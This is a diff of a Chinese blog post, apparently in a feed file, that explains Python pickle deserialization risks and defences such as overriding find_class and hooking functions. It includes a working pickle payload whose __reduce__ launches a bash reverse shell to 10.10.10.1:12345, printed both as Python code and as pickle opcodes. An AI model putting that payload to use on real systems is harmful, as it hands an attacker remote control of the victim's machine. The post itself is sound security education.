@@ -11,7 +11,7 @@
         </tags>
         <content type="html">  《泾溪》&amp;ndash; 杜荀鹤
 泾溪石险人兢慎，终岁不闻倾覆人。
-却是平流无石处，时时闻说有沉论。
+却是平流无石处，时时闻说有沉沦。
  案例 有次同事找我看个Python的安全问题。测试代码是这样的：
 import pickle import os class Test(object): def __reduce__(self): cmd = &amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34; return (os.system,(cmd,)) if __name__ == &amp;#34;__main__&amp;#34;: test = Test() bs = pickle.dumps(test) pickle.loads(bs) 这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。
 目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。
@@ -20,10 +20,10 @@ import pickle import os class Test(object): def __reduce__(self): cmd = &amp;#34
 It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
 Consider signing data with hmac if you need to ensure that it has not been tampered with.
  简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。
-pickle是一种基于栈的编程语言，目前发展到python3.8已有5个版本协议。我们使用python2先看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:
-cposix system p0 (S&amp;#39;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#39; p1 tp2 Rp3 . 这是pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：
+pickle是一种基于栈的编程语言，目前发展到python3.8已有5个协议版本。我们先使用python2来看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:
+cposix system p0 (S&amp;#39;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#39; p1 tp2 Rp3 . 这里涉及到pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：
  指令处理器(Instruction processor)：解释与执行指令，遇到.结束 栈区(stack)：数据处理过程中的暂存区，通过进出栈完成数据操作 标签区(memo)：数据索引或者标记，全生命周期存储数据，以Key/Value存储数据  结合上面生成的内容来看，它有如下指令：
- c：读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中。注：os模块在linux下其实是posix (：标记对象压入到栈中, 常搭配t指令一起使用, 以便产生一个元组 t：从堆栈中弹出对象，创建一个包含弹出对象除了(的元组对象 S：后面跟字符串，遇到换行将内容压入到栈中 R：将之前压入栈中的元组和可调用对象全部弹出，将该元组作为可调用参数的对象并执行该对象，并把执行结果压入到栈中 .：结束整个pickle反序列化过程 p1~p3：将栈顶数据存入memo中，后面的数字是编号  当然pickle还有其它的指令，这里就不再一一列出了，更多的指令可以查看pickle的源码pickle.py。
+ c：读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中。注：os模块在linux下其实是posix (：标记对象压入到栈中, 常搭配t指令一起使用, 以便产生一个元组 t：从堆栈中弹出对象，创建一个包含弹出对象除了(的元组对象 S：后面跟字符串，遇到换行将内容压入到栈中 R：将之前压入栈中的元组和可调用对象全部弹出，将该元组作为可调用参数的对象并执行该对象，并把执行结果压入到栈中 .：结束整个pickle反序列化过程 p1~p3：将栈顶数据存入memo中，后面的数字是编号  当然pickle还有其它的指令，这里就不再一一列了，更多的指令可以查看pickle的源码pickle.py。
 pickle反序列化漏洞出在__reduce__函数上，当采用C语言定义Python扩展类型时，若想pickle此类型，则需要告诉python如何pickle它们。一旦 __reduce__函数定义，pickle序列化时会被调用，它要么返回一个代表全局名称的字符串，要么返回一个元组。这个元组包含2到6个元素，其中包括：
  一个可调用的对象，用于重建对象时调用 一个参数元素，供那个可调用对象使用 被传递给 __setstate__ 的状态， 可选 一个产生被pickle的列表元素的迭代器，可选 一个产生被pickle的字典元素的迭代器，可选 一个可以调用的callable，参数为(obj, state)，可选，3.8才新增的  就是由于个这个元组，跟pickle中的指令R可被利用之机：&amp;ldquo;该元组作为可调用参数的对象并执行该对象&amp;rdquo;，如果这个元组有恶意代码，则可以调用而产生风险。虽然__reduce__返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。
 解决办法 正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：
@@ -38,7 +38,7 @@ class Hook: def __init__(self): self._hook_to_orig = dict() self._orig_to_hook =
  register：装饰器函数，用于注册hook的函数，保存与原始函数映射关系 get_orig_func：用于获取原始函数  假定把上面的代码放在一个叫hook.py文件中，创建一个hook.pth放在site-packages目录下，它通过runpy.run_module执行hook.py，则可以完成了各种hook，前面的pickle的扩展也可以采用此方法，完成自动加载，并且可以进步在find_class修改，查找已被替换的安全函数，而不是原始函数。
 当然上面的演示只是让替换现有函数看起来美观一些，若应用层代码能拿到hook对象，还是可以找回来原始函数，这就是可以绕开了安全检查（逃逸）。若避免逃逸还需要禁止各种可能的绕过：比如禁止导入hook模块，禁上执行hook代码，禁止执行被hook函数的源码等等。
 再扩展一下，基于上述的机制，我们可以实现一套安全库，用于尽可能减少代码出现潜在的安全风险，把已知经验沉淀下来：比如路径检查，执行命令检查，端口检查，反序列化检查，代码执行检查，xml实体攻击检查，高风险函数禁用等等。我们搞安全，不仅仅是要做CheckList，更加要沉淀代码复用。
-结语 代码安全问题随处可见，犯错的成本很低。道路千万条，安全第一条，通过框架/CBB来减少代码层面的安全风险是一条比较好的路。正好本文开头的诗句所讲的，兢慎减少风险，平流容易大意。做为一名程序员，无论如何，我们要先记住不信任任何外部输入，树立安全风险意识。
+结语 代码安全问题随处可见，犯错的成本很低。&amp;ldquo;道路千万条，安全第一条&amp;rdquo;，通过框架/CBB来减少代码层面的安全风险是一条比较好的路。正好本文开头的诗句所讲的，兢慎减少风险，平流容易大意。做为一名程序员，无论如何，我们要先记住不信任任何外部输入，树立安全风险意识。
 </content>
     </entry>
     
